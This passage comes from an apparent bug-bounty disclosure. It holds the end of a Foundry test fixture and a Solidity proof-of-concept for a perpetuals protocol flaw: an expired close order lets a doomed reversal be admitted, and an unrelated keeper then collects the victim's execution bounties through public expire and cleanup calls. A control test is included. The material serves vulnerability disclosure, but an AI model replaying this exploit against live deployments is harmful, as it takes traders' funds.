            address(lifecycle)
        );
        assertEq(address(router), predictedRouter, "release Router prediction");
        engine.setOrderRouter(address(router));
        clearinghouse.setEngine(address(engine));

        settlementToken.mint(address(this), 2e6);
        settlementToken.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, address(this));
        pool.initializeSeedPosition(true, 1e6, address(this));
        pool.activateTrading();
        _assertReleaseParameters();
    }

    function _riskParams() internal pure returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _feedIds() internal pure returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        ids[0] = PYTH_EUR_USD;
        ids[1] = PYTH_USD_JPY;
        ids[2] = PYTH_GBP_USD;
        ids[3] = PYTH_USD_CAD;
        ids[4] = PYTH_USD_SEK;
        ids[5] = PYTH_USD_CHF;
    }

    function _weights() internal pure returns (uint256[] memory values) {
        values = new uint256[](6);
        values[0] = 576e15;
        values[1] = 136e15;
        values[2] = 119e15;
        values[3] = 91e15;
        values[4] = 42e15;
        values[5] = 36e15;
    }

    function _basePrices() internal pure returns (uint256[] memory values) {
        values = new uint256[](6);
        values[0] = 117_500_000;
        values[1] = 638_000;
        values[2] = 134_480_000;
        values[3] = 72_880_000;
        values[4] = 10_860_000;
        values[5] = 126_100_000;
    }

    function _inversions() internal pure returns (bool[] memory values) {
        values = new bool[](6);
        values[1] = true;
        values[3] = true;
        values[4] = true;
        values[5] = true;
    }

    function _priceData(uint256 targetBasket) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes32[] memory ids = _feedIds();
        uint256[] memory bases = _basePrices();
        bool[] memory inverted = _inversions();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            uint256 normalized = (bases[i] * targetBasket) / 1e8;
            uint256 raw = inverted[i] ? (1e16 + normalized / 2) / normalized : normalized;
            updates[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(raw)),
                    conf: 0,
                    expo: -8,
                    publishTime: block.timestamp,
                    prevPublishTime: block.timestamp - 1
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _assertReleaseParameters() internal view {
        (
            uint256 vpiFactor,
            uint256 maxSkewRatio,
            uint256 maintMarginBps,
            uint256 initMarginBps,
            uint256 fadMarginBps,
            uint256 baseCarryBps,
            uint256 minBountyAssets,
            uint256 bountyBps,
            uint256 keeperShareBps,
            uint256 protocolShareBps
        ) = engine.riskParams();
        assertEq(engine.CAP_PRICE(), CAP_PRICE);
        assertEq(vpiFactor, 0.01e18);
        assertEq(maxSkewRatio, 0.4e18);
        assertEq(maintMarginBps, 10);
        assertEq(initMarginBps, 20);
        assertEq(fadMarginBps, 300);
        assertEq(baseCarryBps, 500);
        assertEq(minBountyAssets, 1e6);
        assertEq(bountyBps, 10);
        assertEq(keeperShareBps, 5000);
        assertEq(protocolShareBps, 0);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.settlementBufferBps(), 25);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(oracle.adverseConfidenceMultiplierBps(), 2500);
        assertEq(oracle.basketMaxConfidenceRatioBps(), 10);
        assertEq(router.minOpenNotionalAssets(), 1000e6);
        assertEq(router.maxPendingOrders(), 5);
        assertEq(CfdTypes.SIZE_QUANTUM, 1e20);
        // Default RouterConfig values hardcoded at construction (packages/perps/src/router/
        // OrderRouterBase.sol and OrderExecutionOrchestrator.sol), not overridden by the release
        // deployment script -- these are the same values the deployed v2.0.0 release runs with.
        assertEq(router.maxExecutionWindowSeconds(), 60, "60s execution window");
        assertEq(router.openOrderExecutionBountyBps(), 1, "1bp open bounty rate");
        assertEq(router.minOpenOrderExecutionBountyAssets(), 10_000, "10,000-atom bounty floor");
        assertEq(router.maxOpenOrderExecutionBountyAssets(), 200_000, "200,000-atom bounty cap");
        assertEq(router.maxPruneOrdersPerCall(), 64, "64-id cleanup cap");
    }

    function _requestDeposit(TrancheVault vault, address lp, uint256 amount) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(TrancheVault vault, address lp, uint256 requestId) internal {
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertGt(claimable, 0, "matured LP deposit");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _settleLp(uint256 targetBasket) internal {
        bytes[] memory data = _priceData(targetBasket);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _fundLps() internal {
        uint256 juniorRequest = _requestDeposit(juniorVault, LPJ1, 600_000e6);
        assertEq(_requestDeposit(juniorVault, LPJ2, 100_000e6), juniorRequest);
        assertEq(_requestDeposit(juniorVault, LPJ3, 100_000e6), juniorRequest);
        assertEq(_requestDeposit(juniorVault, LPJ4, 100_000e6), juniorRequest);
        vm.warp(juniorVault.depositEpochStart(juniorRequest));
        _settleLp(P_OPEN);
        _claimDeposit(juniorVault, LPJ1, juniorRequest);
        _claimDeposit(juniorVault, LPJ2, juniorRequest);
        _claimDeposit(juniorVault, LPJ3, juniorRequest);
        _claimDeposit(juniorVault, LPJ4, juniorRequest);

        uint256 seniorRequest = _requestDeposit(seniorVault, LPS, 100_000e6);
        vm.warp(seniorVault.depositEpochStart(seniorRequest));
        _settleLp(P_OPEN);
        _claimDeposit(seniorVault, LPS, seniorRequest);
        vm.warp(block.timestamp + 1 hours + 1);
        assertEq(pool.totalAssets(), 1_000_002e6, "release seeds plus LP capital");
    }

    function _fundTrader(address trader, uint256 amount) internal {
        settlementToken.mint(trader, amount);
        vm.startPrank(trader);
        settlementToken.approve(address(clearinghouse), amount);
        clearinghouse.deposit(trader, amount);
        vm.stopPrank();
    }

    function _boundedRequest(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(
            abi.encode("PLETHER-POC-ORDER", account, router.nextCommitId(), side, size, margin, isClose)
        );
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = isClose
            ? (side == CfdTypes.Side.LONG ? type(uint256).max : 1)
            : (side == CfdTypes.Side.LONG ? 1 : type(uint256).max);
        request.isClose = isClose;
        uint256 window = router.maxExecutionWindowSeconds();
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _order(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 targetBasket
    ) internal {
        OrderV3Types.OrderRequest memory request = _boundedRequest(account, side, size, margin, isClose);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _priceData(targetBasket);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

}
```
<!-- END_INLINE_FILE af020-poc/test/PletherPerpsReleaseFixture.sol -->

<!-- INLINE_FILE af020-poc/test/PletherAF020DoomedOpenBounty.t.sol -->
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {console2} from "forge-std/console2.sol";

import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

import {PletherPerpsReleaseFixture} from "./PletherPerpsReleaseFixture.sol";

/// @title PLETHER-AF-020 -- already-terminal predecessor projection admits a doomed open and pays
///        its bounty to an unrelated public keeper
/// @notice Runs entirely against the frozen Arbitrum Sepolia v2.0.0 perps release
///         (commit a82d4fefb02768e5b3bddcc97dee371eee24fea8), deployed in-process by
///         PletherPerpsReleaseFixture via the repository's own release-deployment wrappers. No
///         in-scope contract is modified, mocked, or storage-cheated. Every action the "attacker"
///         (KEEPER, an arbitrary unrelated EOA with no special role) takes is an ordinary public
///         call (`commitOrder`, `expireOrder`) available to anyone; no `vm.store`/`vm.etch`/
///         `vm.mockCall`/`deal()`-mint/`vm.prank`-to-a-non-attacker is used in the exploit phase.
///         VICTIM-side funding uses ordinary `deposit()` to seed test capital only, exactly as the
///         repository's own test suite already does throughout `packages/perps/test`.
contract PletherAF020DoomedOpenBountyTest is PletherPerpsReleaseFixture {

    uint256 internal constant VICTIM_DEPOSIT = 100_000e6; // 100,000 USDG
    uint256 internal constant LONG_SIZE = 20e20; // 20 lots (CfdTypes.SIZE_QUANTUM = 1e20)
    uint256 internal constant LONG_MARGIN = 5_000e6;
    uint256 internal constant SHORT_SIZE = 20e20; // same notional magnitude as the closed LONG
    uint256 internal constant SHORT_MARGIN = 5_000e6;

    /// @dev Common setup shared by the attack and the control: fund LPs so the market has depth,
    ///      fund the victim, open a LONG, and queue (commit, do not execute) a full LONG close.
    ///      Returns the predecessor close order id and the account state immediately before the
    ///      close's 60-second execution window elapses.
    function _commonSetupToExpiredPredecessor() internal returns (uint64 predecessorId) {
        _fundLps();
        _fundTrader(VICTIM, VICTIM_DEPOSIT);

        // 1. Victim opens a LONG.
        _order(VICTIM, CfdTypes.Side.LONG, LONG_SIZE, LONG_MARGIN, false, P_OPEN);
        (uint256 sizeAfterOpen,,,, CfdTypes.Side sideAfterOpen,,) = engine.positions(VICTIM);
        assertEq(sizeAfterOpen, LONG_SIZE, "LONG opened");
        assertTrue(sideAfterOpen == CfdTypes.Side.LONG, "LONG side");

        // 2. Victim queues (commits, does not execute) an ordinary full LONG close.
        OrderV3Types.OrderRequest memory closeRequest =
            _boundedRequest(VICTIM, CfdTypes.Side.LONG, LONG_SIZE, 0, true);
        vm.prank(VICTIM);
        predecessorId = router.commitOrder(closeRequest);
        assertTrue(predecessorId != 0, "predecessor close committed");

        // 3. The close's ordinary 60-second execution window elapses with nobody executing it.
        //    This is the deployed release's own window (OrderExecutionOrchestrator
        //    .DEFAULT_MAX_EXECUTION_WINDOW_SECONDS = 60), asserted above in
        //    _assertReleaseParameters(). It is now provably terminal: any execution attempt
        //    the canonical path (OrderRouterExecutionSidecar.executeOrderItemFromSidecar,
        //    `block.timestamp > pending.timing.executionDeadline`) must classify as Expired.
        vm.warp(block.timestamp + router.maxExecutionWindowSeconds() + 1);
    }

    /// @notice ATTACK: the already-expired predecessor close stays linked in the account's pending
    ///         queue. An ordinary public commit for the opposite-side (SHORT) reversal is admitted
    ///         anyway, because `OrderLiquidationBatchLogic._queuedPosition`
    ///         (packages/perps/src/router/OrderLiquidationBatchLogic.sol:367-402) projects every
    ///         linked predecessor close without checking its own deadline or configuration hash --
    ///         unlike the canonical execution predicate the sidecar itself uses
    ///         (OrderRouterExecutionSidecar.sol:371, 388-394, 400-414) a few lines away in the same
    ///         package. The open reserves a victim-funded execution bounty. An unrelated ordinary
    ///         keeper (KEEPER, never granted any role) then calls only the public, permissionless
    ///         `expireOrder` twice and is paid the full bounty, while the victim's original LONG
    ///         exposure is left completely unchanged (the "reversal" never actually executes).
    function test_AF020_Attack_DoomedOpenAdmittedAndBountyStolen() public {
        uint64 predecessorId = _commonSetupToExpiredPredecessor();

        (uint256 sizeBeforeReversal, uint256 entryBeforeReversal,,, CfdTypes.Side sideBeforeReversal,,) =
            engine.positions(VICTIM);
        uint256 victimBalanceBeforeReversal = clearinghouse.balanceAssets(VICTIM);
        uint256 keeperBalanceBefore = clearinghouse.balanceAssets(KEEPER);

        // 4. Victim submits an ordinary opposite-side (SHORT) reversal. Admission reads
        //    `_queuedPosition`, which still applies the already-expired LONG close and reports the
        //    account as flat, so the live planner's MUST_CLOSE_OPPOSING check is bypassed. This
        //    commit must NOT revert: that is exactly the defect.
        OrderV3Types.OrderRequest memory openRequest =
            _boundedRequest(VICTIM, CfdTypes.Side.SHORT, SHORT_SIZE, SHORT_MARGIN, false);
        vm.prank(VICTIM);
        uint64 successorId = router.commitOrder(openRequest);
        assertTrue(successorId != 0, "doomed SHORT open admitted");

        (IOrderRouterAccounting.PendingOrderView memory successorView,) = router.getPendingOrderView(successorId);
        uint256 reservedBounty = successorView.executionBountyAssets;
        console2.log("reserved execution bounty for the doomed SHORT open (atoms)", reservedBounty);
        assertGt(reservedBounty, 0, "doomed open reserved a nonzero victim-funded bounty");
        assertLe(reservedBounty, router.maxOpenOrderExecutionBountyAssets(), "bounty within the deployed cap");

        // 5. The successor's own 60-second window also elapses with nobody executing it (either
        //    an execution attempt would classify PlannerRejected/MUST_CLOSE_OPPOSING against the
        //    live, unchanged LONG, or -- as exercised here -- it is left to expire outright; the
        //    dossier's "Reproduction and controls" documents the execute-into-PlannerRejected path
        //    as an equivalent terminal outcome that also pays the keeper the same reservation).
        vm.warp(block.timestamp + router.maxExecutionWindowSeconds() + 1);

        // 6. An unrelated ordinary public keeper (no role, no key) terminalizes both orders with
        //    only the public, permissionless expireOrder entrypoint.
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory predecessorResult = router.expireOrder(predecessorId);
        assertTrue(predecessorResult.status == OrderV3Types.LifecycleStatus.Failed, "predecessor expired");

        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory successorResult = router.expireOrder(successorId);
        assertTrue(successorResult.status == OrderV3Types.LifecycleStatus.Failed, "successor expired");

        // 7. The reserved bounty moved from victim to keeper; the victim's original LONG exposure
        //    is byte-for-byte unchanged; no market loss and no position state change is claimed.
        uint256 victimBalanceAfter = clearinghouse.balanceAssets(VICTIM);
        uint256 keeperBalanceAfter = clearinghouse.balanceAssets(KEEPER);
        assertEq(keeperBalanceAfter - keeperBalanceBefore, reservedBounty, "keeper gained exactly the bounty");
        assertEq(
            victimBalanceBeforeReversal - victimBalanceAfter, reservedBounty, "victim lost exactly the bounty"
        );

        (uint256 sizeAfter, uint256 entryAfter,,, CfdTypes.Side sideAfter,,) = engine.positions(VICTIM);
        assertEq(sizeAfter, sizeBeforeReversal, "LONG size unchanged");
        assertEq(entryAfter, entryBeforeReversal, "LONG entry price unchanged");
        assertTrue(sideAfter == sideBeforeReversal, "LONG side unchanged");
        assertTrue(sideAfter == CfdTypes.Side.LONG, "position is still the original LONG");

        console2.log("victim settlement loss (atoms)", reservedBounty);
        console2.log("unrelated keeper gross gain (atoms)", reservedBounty);
    }

    /// @notice ATTACK, MAXIMAL FORM: the account's full five-order pending cap (one expired
    ///         predecessor close plus four successor SHORT opens) is reached and terminalized with
    ///         a single public `clearInvalidOrders` call, matching the deployed release's own
    ///         64-id, one-transaction cleanup entrypoint. Only the FIRST successor open depends on
    ///         the defect (it is the one an opposing-side check would otherwise reject); the
    ///         following three are ordinary same-side position increases that the account's
    ///         now-SHORT queued projection admits normally and that simply accumulate their own
    ///         bounty reservations up to the deployed five-order cap -- exactly the composition
    ///         S481/S482 measured on the exact deployed Arbitrum Sepolia v2.0.0 contracts.
    function test_AF020_Attack_MaximalFourSuccessorBatchCleanup() public {
        uint64 predecessorId = _commonSetupToExpiredPredecessor();

        uint256 victimBalanceBeforeReversal = clearinghouse.balanceAssets(VICTIM);
        uint256 keeperBalanceBefore = clearinghouse.balanceAssets(KEEPER);

        uint64[] memory successorIds = new uint64[](4);
        uint256 totalReservedBounty;
        for (uint256 i; i < 4; ++i) {
            OrderV3Types.OrderRequest memory openRequest =
                _boundedRequest(VICTIM, CfdTypes.Side.SHORT, SHORT_SIZE, SHORT_MARGIN, false);
            vm.prank(VICTIM);
            uint64 successorId = router.commitOrder(openRequest);
            assertTrue(successorId != 0, "successor admitted");
            successorIds[i] = successorId;
            (IOrderRouterAccounting.PendingOrderView memory view_,) = router.getPendingOrderView(successorId);
            totalReservedBounty += view_.executionBountyAssets;
        }
        assertEq(totalReservedBounty, 4 * 200_000, "four successors each hit the 200,000-atom cap");

        // Every successor's own 60-second window elapses.
        vm.warp(block.timestamp + router.maxExecutionWindowSeconds() + 1);

        uint64[] memory allIds = new uint64[](5);
        allIds[0] = predecessorId;
        for (uint256 i; i < 4; ++i) {
            allIds[i + 1] = successorIds[i];
        }

        // One ordinary public keeper, one zero-value state-changing transaction, no oracle payload.
        vm.prank(KEEPER);
        (uint256 nextIndex, uint256 cleared) = router.clearInvalidOrders(allIds);
        assertEq(nextIndex, 5, "all five ids walked");
        assertEq(cleared, 5, "all five ids cleared");

        uint256 victimBalanceAfter = clearinghouse.balanceAssets(VICTIM);
        uint256 keeperBalanceAfter = clearinghouse.balanceAssets(KEEPER);
        assertEq(keeperBalanceAfter - keeperBalanceBefore, 800_000, "keeper gained exactly 800,000 atoms");
        assertEq(
            victimBalanceBeforeReversal - victimBalanceAfter, 800_000, "victim lost exactly 800,000 atoms"
        );

        (uint256 sizeAfter,,,, CfdTypes.Side sideAfter,,) = engine.positions(VICTIM);
        assertEq(sizeAfter, LONG_SIZE, "original LONG size unchanged");
        assertTrue(sideAfter == CfdTypes.Side.LONG, "original LONG side unchanged");

        console2.log("maximal single-account victim loss (atoms)", uint256(800_000));
        console2.log("maximal single-account keeper gross gain (atoms)", uint256(800_000));
    }

    /// @notice CONTROL (right-reason): identical branch point and identical victim-authored SHORT
    ///         reversal request, except the already-expired predecessor is cleared FIRST, through
    ///         the same public, permissionless `expireOrder` entrypoint, before the reversal is
    ///         committed. The identical request now reverts at admission with the canonical
    ///         `OrderRouter__PredictableOpenInvalid(MUST_CLOSE_OPPOSING)`, creating no successor
    ///         order and no bounty reservation. This isolates the stale predecessor projection as
    ///         the but-for cause of the attack branch's admitted doomed open.
    function test_AF020_Control_ClearingPredecessorFirstRejectsTheIdenticalOpen() public {
        uint64 predecessorId = _commonSetupToExpiredPredecessor();

        // The same unrelated public keeper clears the expired predecessor BEFORE the reversal is
        // ever submitted -- an action freely available in the attack branch too, which is exactly
        // why the attack branch's admission is the defect rather than an unavoidable race.
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory predecessorResult = router.expireOrder(predecessorId);
        assertTrue(predecessorResult.status == OrderV3Types.LifecycleStatus.Failed, "predecessor expired");

        OrderV3Types.OrderRequest memory openRequest =
            _boundedRequest(VICTIM, CfdTypes.Side.SHORT, SHORT_SIZE, SHORT_MARGIN, false);

        vm.expectRevert(
            abi.encodeWithSelector(
                IOrderRouterErrors.OrderRouter__PredictableOpenInvalid.selector,
                uint8(CfdEnginePlanTypes.OpenRevertCode.MUST_CLOSE_OPPOSING)
            )
        );
        vm.prank(VICTIM);
        router.commitOrder(openRequest);
    }

}
```
<!-- END_INLINE_FILE af020-poc/test/PletherAF020DoomedOpenBounty.t.sol -->

